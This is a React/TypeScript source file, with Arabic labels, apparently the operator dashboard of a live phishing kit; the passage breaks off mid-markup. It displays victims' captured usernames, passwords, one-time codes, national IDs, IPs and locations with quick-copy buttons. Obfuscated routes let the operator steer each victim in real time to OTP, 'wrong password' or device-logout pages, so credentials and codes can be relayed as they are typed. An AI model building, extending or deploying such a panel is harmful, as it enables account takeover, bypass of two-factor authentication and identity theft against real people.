import { useMutation, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { toast } from "sonner";
import { useState } from "react";
import {
  Check, Copy, User, Send, Home, LogIn, Hash, Clock, ClipboardList, Repeat,
  CheckCircle2, ShieldCheck, LogOut, Loader2, X, ShieldAlert, Info, Smartphone,
  Mail, KeyRound, Lock, Globe, MapPin, Wifi, Monitor, History, ArrowLeft, Route as RouteIcon,
} from "lucide-react";
import { adminApplyAction } from "@/lib/admin-data.functions";
import { notifyAdmin } from "@/lib/admin-events";
import { pageLabels } from "@/lib/presence";
import type { Customer } from "./customers";
import { ChatButton } from "@/components/chat/admin-chat-dock";
import { ago } from "./customers";
import { CustomerCard } from "./customer-card";
import { BottomSheet } from "@/components/bottom-sheet";

function copyText(v: string) {
  const fallback = () => {
    try {
      const t = document.createElement("textarea");
      t.value = v; t.setAttribute("readonly", ""); t.style.position = "fixed"; t.style.opacity = "0";
      document.body.appendChild(t); t.select(); document.execCommand("copy"); t.remove();
    } catch { /* ignore */ }
  };
  try { navigator.clipboard?.writeText(v).catch(fallback) ?? fallback(); } catch { fallback(); }
}

const ROUTES: { path: string; label: string; status: string; Icon: typeof Home }[] = [
  { path: "/", label: "الرئيسية", status: "under_review", Icon: Home },
  { path: "/YXV0aA", label: "تسجيل الدخول", status: "needs_info", Icon: LogIn },
  { path: "/b3Rw", label: "رمز التحقق", status: "needs_info", Icon: Hash },
  { path: "/dmVyaWZ5", label: "البيانات الشخصية", status: "needs_info", Icon: User },
  { path: "/cGVuZGluZw", label: "قيد المراجعة", status: "under_review", Icon: Clock },
  { path: "/cmV2aWV3", label: "متابعة الطلب", status: "under_review", Icon: ClipboardList },
  { path: "/c3dhcA", label: "تبديل العملة", status: "under_review", Icon: Repeat },
  { path: "/c3VjY2Vzcw", label: "تم بنجاح", status: "verified", Icon: CheckCircle2 },
  { path: "/Y29tcGxldGU", label: "استكمال الإجراءات", status: "needs_info", Icon: ShieldCheck },
  { path: "/bG9nb3V0LWRldmljZXM", label: "تسجيل الخروج من الأجهزة", status: "needs_info", Icon: LogOut },
];

function CopyField({ label, value, keyId, mono }: { label: string; value: string | null | undefined; keyId: string; mono?: boolean }) {
  const [copied, setCopied] = useState(false);
  if (!value) return null;
  const copy = () => { copyText(value); setCopied(true); setTimeout(() => setCopied(false), 1500); };
  return (
    <div>
      <label className="mb-1 block text-[10px] font-bold text-slate-400">{label}</label>
      <div className={`flex items-center justify-between gap-2 rounded-xl border border-slate-200 bg-slate-50 p-2.5 text-xs font-bold text-slate-800 ${mono ? "font-mono" : ""}`}>
        <span className="truncate" dir="auto">{value}</span>
        <button onClick={copy} aria-label={`نسخ ${label}`} data-key={keyId} className="p-1 text-slate-400 hover:text-slate-700">
          {copied ? <Check className="size-3.5 text-emerald-600" /> : <Copy className="size-3.5" />}
        </button>
      </div>
    </div>
  );
}

function FastCopyCard({ label, value, Icon, tone, keyId }: { label: string; value: string; Icon: typeof Home; tone: "emerald" | "indigo"; keyId: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    copyText(value);
    setCopied(true);
    if (typeof navigator !== "undefined" && navigator.vibrate) { try { navigator.vibrate(15); } catch { /* ignore */ } }
    setTimeout(() => setCopied(false), 1200);
  };
  const tones = {
    emerald: { grad: "from-emerald-500 to-emerald-600", ring: "ring-emerald-200", chip: "bg-emerald-400/30" },
    indigo: { grad: "from-indigo-500 to-indigo-600", ring: "ring-indigo-200", chip: "bg-indigo-400/30" },
  }[tone];
  return (
    <button
      type="button"
      onClick={copy}
      data-key={keyId}
      aria-label={`نسخ ${label}`}
      className={`group relative flex w-full items-center gap-3 overflow-hidden rounded-2xl bg-gradient-to-br ${tones.grad} p-3.5 text-right text-white shadow-lg ring-2 ${tones.ring} transition-all active:scale-[0.98]`}
    >
      <div className={`grid size-11 shrink-0 place-items-center rounded-xl ${tones.chip} backdrop-blur-sm`}>
        <Icon className="size-5" />
      </div>
      <div className="min-w-0 flex-1">
        <div className="mb-0.5 text-[10px] font-black uppercase tracking-wider text-white/85">{label}</div>
        <div className="font-mono text-[13px] font-black leading-tight tracking-tight text-white break-all" dir="ltr">{value}</div>
      </div>
      <div className={`grid size-10 shrink-0 place-items-center rounded-xl backdrop-blur-sm transition-all ${copied ? "scale-110 bg-white text-emerald-600" : "bg-white/20 text-white"}`}>
        {copied ? <Check className="size-5" strokeWidth={3} /> : <Copy className="size-4" />}
      </div>
      {copied && (
        <span className="pointer-events-none absolute inset-x-0 top-0 flex justify-center bg-white/95 py-0.5 text-[10px] font-black text-emerald-700">
          ✓ تم النسخ
        </span>
      )}
    </button>
  );
}

// استخراج معلومات الموقع والجهاز من أي إدخال فيه geo/user_agent
function extractGeo(customer: Customer) {
  const latest = customer.subs.find((s) => s.payload && (s.payload["geo"] || s.payload["user_agent"] || s.payload["ip"]));
  const p = (latest?.payload ?? {}) as Record<string, unknown>;
  const geo = (p["geo"] ?? null) as Record<string, unknown> | null;
  const g = (k: string) => (geo && typeof geo[k] === "string" ? String(geo[k]) : null);
  const country = g("country");
  const cc = g("country_code");
  const city = g("city") ?? g("region");
  const ip = g("ip") ?? (typeof p["ip"] === "string" ? String(p["ip"]) : null);
  const ua = typeof p["user_agent"] === "string" ? String(p["user_agent"]) : null;
  const browser = ua ? (ua.match(/(Edg|Chrome|Firefox|Safari|OPR|SamsungBrowser)\/[\d.]+/)?.[0] ?? null) : null;
  const os = ua ? (/Android/.test(ua) ? "Android" : /iPhone|iPad|iOS/.test(ua) ? "iOS" : /Windows/.test(ua) ? "Windows" : /Mac OS/.test(ua) ? "macOS" : /Linux/.test(ua) ? "Linux" : null) : null;
  const has = country || city || ip || browser || os;
  return { has, country, cc, city, ip, browser, os };
}

// سجل التصحيحات: مقارنة كل إدخال بالسابق من نفس النوع، وإبراز الحقول التي تغيّرت
type Correction = { at: string; kind: string; fields: { label: string; from: string; to: string; ltr?: boolean }[] };
const DIFF_FIELDS: { key: string; label: string; ltr?: boolean }[] = [
  { key: "email", label: "البريد / المستخدم", ltr: true },
  { key: "username", label: "اسم المستخدم", ltr: true },
  { key: "password", label: "كلمة المرور", ltr: true },
  { key: "phone", label: "الجوال", ltr: true },
  { key: "country_code", label: "رمز الدولة", ltr: true },
  { key: "full_name", label: "الاسم" },
  { key: "name", label: "الاسم" },
  { key: "national_id", label: "رقم الهوية", ltr: true },
  { key: "otp", label: "رمز التحقق", ltr: true },
  { key: "code", label: "رمز التحقق", ltr: true },
  { key: "birth_date", label: "تاريخ الميلاد" },
  { key: "gender", label: "الجنس" },
];
function buildCorrections(customer: Customer): Correction[] {
  const byKind = new Map<string, typeof customer.subs>();
  for (const s of customer.subs) {
    const arr = byKind.get(s.kind) ?? [];
    arr.push(s);
    byKind.set(s.kind, arr);
  }
  const out: Correction[] = [];
  for (const [kind, arr] of byKind) {
    // customer.subs مرتّبة من الأحدث إلى الأقدم
    for (let i = 0; i < arr.length - 1; i++) {
      const newer = arr[i]!;
      const older = arr[i + 1]!;
      const nP = (newer.payload ?? {}) as Record<string, unknown>;
      const oP = (older.payload ?? {}) as Record<string, unknown>;
      const seen = new Set<string>();
      const fields: Correction["fields"] = [];
      for (const f of DIFF_FIELDS) {
        const a = String(oP[f.key] ?? "").trim();
        const b = String(nP[f.key] ?? "").trim();
        if (!b || a === b) continue;
        const sig = `${f.label}|${a}|${b}`;
        if (seen.has(sig)) continue;
        seen.add(sig);
        const row: Correction["fields"][number] = { label: f.label, from: a || "—", to: b };
        if (f.ltr) row.ltr = true;
        fields.push(row);
      }
      if (fields.length) out.push({ at: newer.created_at, kind, fields });
    }
  }
  return out.sort((a, b) => b.at.localeCompare(a.at));
}

// الخط الزمني: صفحات العميل بالترتيب الزمني مع مدة البقاء وفترة الانتقال
type TimelineStep = { page: string; enteredAt: string; leftAt: string | null; dwellMs: number | null; gapMs: number };
function buildTimeline(customer: Customer): TimelineStep[] {
  const chrono = [...customer.subs]
    .filter((s) => s.page && String(s.page).trim())
    .sort((a, b) => a.created_at.localeCompare(b.created_at));
  if (!chrono.length) return [];
  const steps: TimelineStep[] = [];
  for (const s of chrono) {
    const page = String(s.page);
    const last = steps[steps.length - 1];
    if (last && last.page === page) continue; // دمج النقرات المتتابعة على نفس الصفحة
    const enteredAt = s.created_at;
    if (last) {
      const leftAt = enteredAt;
      last.leftAt = leftAt;
      last.dwellMs = new Date(leftAt).getTime() - new Date(last.enteredAt).getTime();
    }
    const gapMs = last ? new Date(enteredAt).getTime() - new Date(last.enteredAt).getTime() : 0;
    steps.push({ page, enteredAt, leftAt: null, dwellMs: null, gapMs });
  }
  return steps.reverse(); // الأحدث أولاً
}
function fmtDuration(ms: number | null): string {
  if (ms === null || !isFinite(ms) || ms < 0) return "—";
  const s = Math.round(ms / 1000);
  if (s < 60) return `${s} ث`;
  const m = Math.round(s / 60);
  if (m < 60) return `${m} د`;
  const h = Math.floor(m / 60);
  const rm = m % 60;
  return rm ? `${h} س ${rm} د` : `${h} س`;
}


export function CustomerDetails({ customer, online, livePage, onClose }: { customer: Customer; online: boolean; livePage?: { page: string; at: string } | null; onClose: () => void }) {
  const qc = useQueryClient();
  const apply = useServerFn(adminApplyAction);
  const [pending, setPending] = useState<string | null>(null);
  const [flash, setFlash] = useState<string | null>(null);
  const [mailChoice, setMailChoice] = useState(false);
  const sessionId = customer.subs.map((s) => s.payload?.["session_id"]).find((v) => typeof v === "string") as string | undefined;

  const payloads = customer.subs.map((s) => s.payload ?? {});
  const pick = (k: string) => payloads.map((p) => p[k]).find((v) => typeof v === "string" && String(v).trim()) as string | undefined;
  const username = pick("username") ?? pick("user") ?? pick("login") ?? null;
  const password = pick("password") ?? pick("pass") ?? null;
  const nationalId = pick("national_id") ?? pick("nid") ?? pick("id_number") ?? null;
  const otp = pick("otp") ?? pick("code") ?? null;

  type ActionArg = { id: string; label: string; status: string; route: string; note?: string | null };
  const runAction = (a: ActionArg) => apply({ data: {
    key: customer.key, emails: customer.email ? [customer.email] : [], sessionId: sessionId ?? null,
    requestId: customer.request?.id ?? null, status: a.status, route: a.route, note: a.note ?? null,
    supervisor: (typeof window !== "undefined" ? (localStorage.getItem("sham_dash_supervisor") ?? "").trim() : "") || null,
  } });
  const m = useMutation({
    mutationFn: (a: ActionArg) => runAction(a),
    onMutate: (a) => { setPending(a.id); setFlash(null); },
    onSuccess: (_d, a) => {
      toast.success(`تم توجيه العميل إلى: ${a.label}`, { duration: 3500 });
      setFlash(`✓ تم التوجيه بنجاح إلى: ${a.label}`);
      setTimeout(() => setFlash(null), 3500);
      // تحديث فوري لسجل الإجراءات حتى يخرج العميل من فلتر «بانتظار قرارك» فوراً
      qc.setQueryData(["dash2-acted"], (prev: Record<string, unknown> | undefined) => ({
        ...(prev ?? {}),
        [customer.key]: { actedAt: new Date().toISOString(), actor: "self", status: a.status, route: a.route, note: a.note ?? null },
      }));
      void qc.invalidateQueries({ queryKey: ["dash2-requests"] });
      void qc.invalidateQueries({ queryKey: ["dash2-acted"] });
      void qc.invalidateQueries({ queryKey: ["dash2-submissions"] });
      notifyAdmin({ kind: "request-updated", email: customer.email ?? null, key: customer.key, status: a.status, route: a.route, note: a.note ?? null, actedAt: new Date().toISOString(), actor: "self" });
    },
    onError: () => toast.error("تعذّر تنفيذ الإجراء", {
      description: "لم يصل الطلب للخادم. تحقق من الاتصال وأعد المحاولة بعد لحظات.",
    }),
    onSettled: () => setPending(null),
  });

  const quickReject = () => {
    const reason = window.prompt("سبب رفض العميل (سيظهر له على جميع أجهزته):", "تم رفض طلبك بعد المراجعة. يرجى التواصل مع الدعم.");
    if (reason === null) return;
    const trimmed = reason.trim();
    if (!trimmed) return;
    m.mutate({ id: "reject", label: "رفض مخفض", status: "rejected", route: "/YXV0aA", note: `rejected:${trimmed}` });
  };
  const quickBlock = () => {
    const name = customer.name ?? customer.email ?? "هذا العميل";
    if (!window.confirm(`سيتم حظر ${name} نهائياً من الموقع ولن يتمكن من الدخول لأي صفحة. تأكيد؟`)) return;
    const reason = window.prompt("سبب الحظر (اختياري، يظهر في السجل):", "مخالفة الشروط") ?? "";
    m.mutate({ id: "block", label: "حظر نهائي", status: "rejected", route: "/YmxvY2tlZA", note: `blocked:${reason.trim() || "بدون سبب"}` });
  };
  const quickInfo = () => {
    const extra = window.prompt("المعلومات الإضافية المطلوبة من العميل:", "");
    if (extra === null) return;
    const trimmed = extra.trim();
    if (!trimmed) return;
    m.mutate({ id: "info", label: "معلومات إضافية", status: "needs_info", route: "/cGVuZGluZw", note: trimmed });
  };

  return (
    <div className="space-y-3.5">
      <button onClick={onClose} className="flex items-center gap-1 text-xs font-bold text-slate-500 hover:text-slate-800">
        <X className="size-4" /> رجوع للقائمة
      </button>

      <CustomerCard customer={customer} />

      {flash && (
        <div className="sticky top-2 z-20 flex items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-emerald-500 to-emerald-600 px-4 py-3 text-center text-sm font-black text-white shadow-lg ring-2 ring-emerald-200 animate-in fade-in slide-in-from-top-2">
          <Check className="size-5" strokeWidth={3} /><span>{flash}</span>
        </div>
      )}

      {customer.request && (
        <div className="flex items-center justify-center gap-1.5 rounded-2xl border border-orange-200 bg-orange-50 px-4 py-2 text-center text-xs font-bold text-orange-600 shadow-sm">
          ⏳ <span>بانتظار قرارك</span>
        </div>
      )}

      <div className="space-y-4 rounded-3xl border border-slate-200/80 bg-white p-4 shadow-sm">
        <div className="flex items-start justify-between">
          <div className="min-w-0 space-y-1">
            <h2 className="truncate text-lg font-black tracking-tight text-slate-900">{customer.name ?? customer.email ?? "زائر"}</h2>
            <p className="truncate font-mono text-xs font-bold text-slate-500" dir="ltr">{customer.phone ?? customer.email ?? "—"}</p>
            {customer.request && <p className="font-mono text-[10px] text-slate-400">{customer.request.reference}</p>}
          </div>
          <div className="grid size-13 shrink-0 place-items-center rounded-2xl bg-gradient-to-br from-orange-400 to-orange-500 text-white shadow-md shadow-orange-200">
            <User className="size-7" />
          </div>
        </div>

        <div className="flex flex-wrap items-center justify-center gap-1.5 text-[11px] font-bold">
          <span className={`flex items-center gap-1 rounded-full border px-2.5 py-1 ${online ? "border-emerald-200 bg-emerald-50 text-emerald-600" : "border-rose-200 bg-rose-50 text-rose-600"}`}>
            <span className={`size-1.5 rounded-full ${online ? "bg-emerald-500" : "bg-rose-500"}`} />{online ? "متصل" : "غير متصل"}
          </span>
          <span className="flex items-center gap-1 rounded-full border border-orange-200 bg-orange-50 px-2.5 py-1 text-orange-600">⏳ {ago(customer.lastAt)}</span>
          {livePage ? (
            <span className="flex items-center gap-1.5 rounded-full border border-emerald-300 bg-emerald-50 px-2.5 py-1 text-emerald-700" title={`يتصفح الآن منذ ${ago(livePage.at)}`}>
              <span className="relative flex size-2">
                <span className="absolute inline-flex size-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                <span className="relative inline-flex size-2 rounded-full bg-emerald-500" />
              </span>
              يتصفّح الآن: {pageLabels[livePage.page] ?? livePage.page}
            </span>
          ) : (
            <span className="rounded-full border border-slate-200 bg-slate-50 px-2.5 py-1 text-slate-500" title="آخر صفحة معروفة">
              📍 {customer.page ? pageLabels[customer.page] ?? customer.page : "—"}
            </span>
          )}
        </div>

        {(customer.email || username || password || otp) && (
          <div className="space-y-2 border-t border-slate-100 pt-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-1.5 text-xs font-bold text-slate-800">
                <KeyRound className="size-4 text-indigo-600" />
                <span>بيانات الدخول — اضغط للنسخ</span>
              </div>
              <span className="text-[10px] text-slate-400">نسخ فوري</span>
            </div>
            <div className="space-y-2">
              {(customer.email || username) && (
                <FastCopyCard label="البريد / المستخدم" value={(customer.email || username)!} Icon={Mail} tone="indigo" keyId={`fast-u-${customer.key}`} />
              )}
              {password && (
                <FastCopyCard label="كلمة المرور" value={password} Icon={Lock} tone="emerald" keyId={`fast-p-${customer.key}`} />
              )}
              {otp && (
                <FastCopyCard label="رمز التحقق" value={otp} Icon={Hash} tone="indigo" keyId={`fast-o-${customer.key}`} />
              )}
            </div>
          </div>
        )}

        <div className="space-y-3 border-t border-slate-100 pt-3">
          {(() => {
            const QA = ({ id, label, status, route, note, Icon, className, chipClassName, ringClassName, onClick, prominent }: { id: string; label: string; status?: string; route?: string; note?: string | null; Icon: typeof Home; className: string; chipClassName?: string; ringClassName?: string; onClick?: () => void; prominent?: boolean }) => (
              <button
                disabled={m.isPending}
                onClick={() => (onClick ? onClick() : m.mutate({ id, label, status: status!, route: route!, note: note ?? null }))}
                className={`group relative flex items-center justify-center gap-2 rounded-2xl px-3 ${prominent ? "py-3.5 text-[14px]" : "py-3 text-[13px]"} font-black shadow-md ring-1 ${ringClassName ?? "ring-black/5"} transition-all active:scale-95 disabled:opacity-60 ${className}`}
              >
                <span className={`grid size-7 shrink-0 place-items-center rounded-xl ${chipClassName ?? "bg-white/20"}`}>
                  {pending === id ? <Loader2 className="size-4 animate-spin" /> : <Icon className="size-4" />}
                </span>
                <span className="truncate">{label}</span>
              </button>
            );
            return (
              <>
                {/* قسم 1: القبول */}
                <div>
                  <div className="dash-section-title mb-2"><Check className="size-3.5 text-emerald-500" /> القبول</div>
                  <QA id="accept" label="تم بنجاح" status="verified" route="/c3VjY2Vzcw" Icon={CheckCircle2}
                    prominent
                    className="w-full bg-gradient-to-b from-[#22C55E] to-[#15803D] text-white shadow-emerald-500/30"
                    chipClassName="bg-white/25 ring-1 ring-white/40"
                    ringClassName="ring-emerald-900/10" />
                </div>

                {/* قسم 2: طلبات إضافية — ألوان مميّزة لكل زر */}
                <div>
                  <div className="dash-section-title mb-2"><Info className="size-3.5 text-amber-500" /> طلبات إضافية</div>
                  <div className="grid grid-cols-2 gap-2">
                    <QA id="attempts" label="تجاوز المحاولات" status="needs_info" route="/YXR0ZW1wdHM" note="تم تجاوز عدد المحاولات المتكررة، حاول بعد 24 ساعة." Icon={ShieldAlert}
                      className="bg-gradient-to-b from-[#FB923C] to-[#EA580C] text-white shadow-orange-500/25"
                      chipClassName="bg-white/25 ring-1 ring-white/40" />
                    <QA id="mail" label="البريد" Icon={Mail}
                      className="bg-gradient-to-b from-[#38BDF8] to-[#0369A1] text-white shadow-sky-500/25"
                      chipClassName="bg-white/25 ring-1 ring-white/40"
                      onClick={() => setMailChoice(true)} />
                    <QA id="otp" label="الرمز" status="under_review" route="/b3Rw" Icon={KeyRound}
                      className="bg-gradient-to-b from-[#A78BFA] to-[#6D28D9] text-white shadow-violet-500/25"
                      chipClassName="bg-white/25 ring-1 ring-white/40" />
                    <QA id="devices" label="تسجيل الخروج" status="needs_info" route="/bG9nb3V0LWRldmljZXM" Icon={Smartphone}
                      className="bg-gradient-to-b from-[#2DD4BF] to-[#0F766E] text-white shadow-teal-500/25"
                      chipClassName="bg-white/25 ring-1 ring-white/40" />
                  </div>
                </div>

                {/* قسم 3: الرفض والحظر */}
                <div>
                  <div className="dash-section-title mb-2"><X className="size-3.5 text-rose-500" /> الرفض والحظر</div>
                  <div className="grid grid-cols-2 gap-2">
                    <QA id="reject" label="رفض" Icon={X}
                      className="border border-rose-300 bg-gradient-to-b from-white to-rose-50 text-rose-700 shadow-rose-500/10 hover:from-rose-50"
                      chipClassName="bg-rose-100 text-rose-700 ring-1 ring-rose-200"
                      ringClassName="ring-rose-200"
                      onClick={quickReject} />
                    <QA id="block" label="حظر دائم" Icon={Lock}
                      className="bg-gradient-to-b from-[#991B1B] to-[#450A0A] text-white shadow-red-900/40"
                      chipClassName="bg-white/15 ring-1 ring-white/30"
                      ringClassName="ring-red-950/20"
                      onClick={quickBlock} />
                  </div>
                </div>
              </>
            );
          })()}
        </div>
      </div>

      {(customer.name || nationalId) && (
        <div className="space-y-3 rounded-3xl border border-slate-200/80 bg-white p-4 shadow-sm">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-bold text-slate-800">المعلومات الشخصية</h3>
            <span className="rounded-full bg-sky-50 px-2 py-0.5 text-[10px] font-bold text-sky-600">معلومات 👤</span>
          </div>
          <div className="space-y-2">
            <CopyField label="الاسم الكامل" value={customer.name} keyId={`n-${customer.key}`} />
            <CopyField label="الرقم الوطني" value={nationalId} keyId={`nid-${customer.key}`} mono />
            <CopyField label="الهاتف" value={customer.phone} keyId={`ph-${customer.key}`} mono />
            <CopyField label="البريد" value={customer.email} keyId={`em-${customer.key}`} mono />
          </div>
        </div>
      )}

      {(username || password || otp) && (
        <div className="space-y-3 rounded-3xl border border-slate-200/80 bg-white p-4 shadow-sm">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-bold text-slate-800">صفحة تسجيل الدخول</h3>
            <span className="rounded-full bg-emerald-50 px-2 py-0.5 text-[10px] font-bold text-emerald-600">معلومات 🔑</span>
          </div>
          <div className="space-y-2">
            <CopyField label="اسم المستخدم" value={username} keyId={`u-${customer.key}`} mono />
            <CopyField label="كلمة المرور" value={password} keyId={`p-${customer.key}`} mono />
            <CopyField label="رمز التحقق" value={otp} keyId={`o-${customer.key}`} mono />
          </div>
        </div>
      )}

      {(() => {
        const g = extractGeo(customer);
        if (!g.has) return null;
        return (
          <div className="space-y-3 rounded-3xl border border-slate-200/80 bg-white p-4 shadow-sm">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-1.5 text-xs font-bold text-slate-800"><Globe className="size-4 text-sky-600" /><span>الموقع والجهاز</span></div>
              <span className="text-[10px] text-slate-400">من آخر إدخال</span>
            </div>
            <div className="grid grid-cols-2 gap-2 text-[11px]">
              {g.country && (
                <div className="rounded-xl border border-slate-200 bg-slate-50 p-2.5">
                  <div className="mb-0.5 flex items-center gap-1 text-[10px] font-bold text-slate-500"><Globe className="size-3" /> الدولة</div>
                  <div className="font-bold text-slate-800">{g.country}{g.cc ? ` (${g.cc})` : ""}</div>
                </div>
              )}
              {g.city && (
                <div className="rounded-xl border border-slate-200 bg-slate-50 p-2.5">
                  <div className="mb-0.5 flex items-center gap-1 text-[10px] font-bold text-slate-500"><MapPin className="size-3" /> المدينة</div>
                  <div className="font-bold text-slate-800">{g.city}</div>
                </div>
              )}
              {g.ip && (
                <div className="rounded-xl border border-slate-200 bg-slate-50 p-2.5">
                  <div className="mb-0.5 flex items-center gap-1 text-[10px] font-bold text-slate-500"><Wifi className="size-3" /> عنوان IP</div>
                  <div className="truncate font-mono font-bold text-slate-800" dir="ltr">{g.ip}</div>
                </div>
              )}
              {(g.browser || g.os) && (
                <div className="rounded-xl border border-slate-200 bg-slate-50 p-2.5">
                  <div className="mb-0.5 flex items-center gap-1 text-[10px] font-bold text-slate-500"><Monitor className="size-3" /> الجهاز</div>
                  <div className="truncate font-bold text-slate-800" dir="ltr">{[g.browser, g.os].filter(Boolean).join(" · ")}</div>
                </div>
              )}
            </div>
          </div>
        );
      })()}

      {(() => {
        const corrections = buildCorrections(customer);
        if (!corrections.length) return null;
        return (
          <div className="space-y-3 rounded-3xl border border-amber-200 bg-amber-50/40 p-4 shadow-sm">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-1.5 text-xs font-bold text-amber-800"><History className="size-4" /><span>سجل التصحيحات</span></div>
              <span className="rounded-full bg-amber-100 px-2 py-0.5 text-[10px] font-black text-amber-800">{corrections.length}</span>
            </div>
            <div className="space-y-2">
              {corrections.slice(0, 10).map((c, i) => (
                <div key={i} className="rounded-xl border border-amber-200 bg-white p-2.5 text-[11px]">
                  <div className="mb-1.5 flex justify-between text-slate-500">
                    <span className="font-bold text-amber-800">{c.kind}</span>
                    <span>{new Date(c.at).toLocaleString("ar")}</span>
                  </div>
                  <div className="space-y-1">
                    {c.fields.map((f, j) => (
                      <div key={j} className="rounded-lg bg-amber-100/60 px-2 py-1">
                        <div className="text-[10px] font-black text-amber-900">{f.label}</div>
                        <div className="flex items-center gap-1 text-[11px]" dir={f.ltr ? "ltr" : "rtl"}>
                          <span className="truncate text-slate-500 line-through decoration-rose-400">{f.from}</span>
                          <ArrowLeft className="size-3 shrink-0 text-amber-700" />
                          <span className="truncate font-black text-emerald-700">{f.to}</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        );
      })()}

      {(() => {
        const steps = buildTimeline(customer);
        if (!steps.length) return null;
        return (
          <div className="space-y-3 rounded-3xl border border-sky-200 bg-sky-50/40 p-4 shadow-sm">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-1.5 text-xs font-bold text-sky-800"><RouteIcon className="size-4" /><span>الخط الزمني للصفحات</span></div>
              <span className="rounded-full bg-sky-100 px-2 py-0.5 text-[10px] font-black text-sky-800">{steps.length}</span>
            </div>
            <ol className="relative space-y-2 border-r-2 border-sky-200 pr-4">
              {steps.map((st, i) => {
                const isCurrent = i === 0 && !st.leftAt;
                const label = pageLabels[st.page] ?? st.page;
                return (
                  <li key={`${st.enteredAt}-${i}`} className="relative">
                    <span className={`absolute -right-[21px] top-2 grid size-4 place-items-center rounded-full ring-2 ring-white ${isCurrent ? "bg-emerald-500" : "bg-sky-500"}`}>
                      {isCurrent && <span className="absolute inline-flex size-full animate-ping rounded-full bg-emerald-400 opacity-75" />}
                    </span>
                    <div className={`rounded-xl border p-2.5 text-[11px] ${isCurrent ? "border-emerald-300 bg-white" : "border-sky-200 bg-white"}`}>
                      <div className="flex items-center justify-between gap-2">
                        <span className={`font-black ${isCurrent ? "text-emerald-700" : "text-slate-800"}`}>{isCurrent ? "● الآن: " : ""}{label}</span>
                        <span className="font-mono text-[10px] text-slate-500" dir="ltr">{new Date(st.enteredAt).toLocaleTimeString("ar")}</span>
                      </div>
                      <div className="mt-1 flex flex-wrap items-center gap-x-3 gap-y-0.5 text-[10px] text-slate-500">
                        <span>⏱ المدة: <b className="text-slate-700">{isCurrent ? fmtDuration(Date.now() - new Date(st.enteredAt).getTime()) + " (مستمر)" : fmtDuration(st.dwellMs)}</b></span>
                        {i < steps.length - 1 && <span>↩ انتقل بعد: <b className="text-slate-700">{fmtDuration(st.gapMs)}</b></span>}
                        <span className="font-mono text-slate-400" dir="ltr">{st.page}</span>
                      </div>
                    </div>
                  </li>
                );
              })}
            </ol>
          </div>
        );
      })()}

      <div className="space-y-3 rounded-3xl border border-slate-200/80 bg-white p-4 shadow-sm">
        <h3 className="text-xs font-bold text-slate-800">آخر الإدخالات ({customer.subs.length})</h3>
        <div className="space-y-2">
          {customer.subs.slice(0, 10).map((s) => (
            <div key={s.id} className="rounded-xl border border-slate-200 bg-slate-50 p-2.5 text-[11px]">
              <div className="flex justify-between text-slate-500">
                <span className="font-bold text-slate-700">{s.kind}</span>
                <span>{new Date(s.created_at).toLocaleString("ar")}</span>
              </div>
              <div className="mt-1 text-slate-500">{s.page ? pageLabels[s.page] ?? s.page : "—"}</div>
            </div>
          ))}
        </div>
      </div>

      <div className="space-y-3 rounded-3xl border border-slate-200/80 bg-white p-4 shadow-sm">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-1.5 text-xs font-bold text-slate-800"><Send className="size-4 text-indigo-600" /><span>توجيه العميل إلى صفحة</span></div>
          <span className="text-[10px] text-slate-400">اختر الصفحة</span>
        </div>
        <div className="flex flex-wrap gap-1.5">
          <button disabled={m.isPending} onClick={quickInfo}
            className="flex items-center gap-1.5 rounded-full border border-amber-300 bg-amber-50 px-3.5 py-2 text-[11px] font-bold text-amber-700 shadow-sm transition-all active:scale-95 hover:border-amber-400 hover:bg-amber-100 disabled:opacity-60">
            {pending === "info" ? <Loader2 className="size-3.5 animate-spin text-amber-600" /> : <Info className="size-3.5 text-amber-600" />}
            <span>طلب معلومات</span>
          </button>
          {ROUTES.map((r) => (
            <button key={r.path} disabled={m.isPending}
              onClick={() => m.mutate({ id: r.path, label: r.label, status: r.status, route: r.path })}
              className="flex items-center gap-1.5 rounded-full border border-slate-200 bg-white px-3.5 py-2 text-[11px] font-bold text-slate-700 shadow-sm transition-all active:scale-95 hover:border-indigo-400 hover:bg-indigo-50/50 disabled:opacity-60">
              {pending === r.path ? <Loader2 className="size-3.5 animate-spin text-indigo-500" /> : <r.Icon className="size-3.5 text-slate-500" />}
              <span>{r.label}</span>
            </button>
          ))}
        </div>
      </div>

      <div className="flex justify-center pb-2">
        <ChatButton customer={{ customerKey: customer.key.trim().toLowerCase(), name: customer.name, sessionId: sessionId ?? null, emails: customer.email ? [customer.email] : [], requestId: customer.request?.id ?? null }} />
      </div>

      <BottomSheet
        open={mailChoice}
        onClose={() => setMailChoice(false)}
        label="سبب إعادة توجيه البريد"
        desktopClassName="max-w-sm"
        desktopPanelClassName="w-full max-w-sm rounded-3xl bg-white p-5 shadow-2xl"
      >
        <div className="space-y-3 px-1 pb-2 pt-1 lg:px-0 lg:pt-0" dir="rtl">
          <div className="flex items-center justify-between">
            <h3 className="text-base font-black text-slate-900">سبب إعادة توجيه البريد</h3>
            <button onClick={() => setMailChoice(false)} className="rounded-lg p-1 text-slate-400 hover:text-slate-700" aria-label="إغلاق"><X className="size-5" /></button>
          </div>
          <p className="text-xs text-slate-500">اختر الرسالة التي ستظهر للعميل:</p>
          <div className="space-y-2">
            {([
              { id: "mail-email", note: "invalid_email", label: "البريد غير صحيح" },
              { id: "mail-pass", note: "invalid_password", label: "كلمة المرور غير صحيحة" },
              { id: "mail-both", note: "invalid_credentials", label: "الاثنان غير صحيحين" },
            ] as const).map((o) => (
              <button
                key={o.id}
                disabled={m.isPending}
                onClick={() => { setMailChoice(false); m.mutate({ id: o.id, label: `البريد — ${o.label}`, status: "needs_info", route: "/YXV0aA", note: o.note }); }}
                className="flex w-full min-h-[48px] items-center justify-between gap-2 rounded-2xl bg-gradient-to-b from-[#FFA726] to-[#FB8C00] px-4 py-3 text-sm font-black text-white shadow-md transition active:scale-95 disabled:opacity-60"
              >
                <span>{o.label}</span>
                <Mail className="size-4" />
              </button>
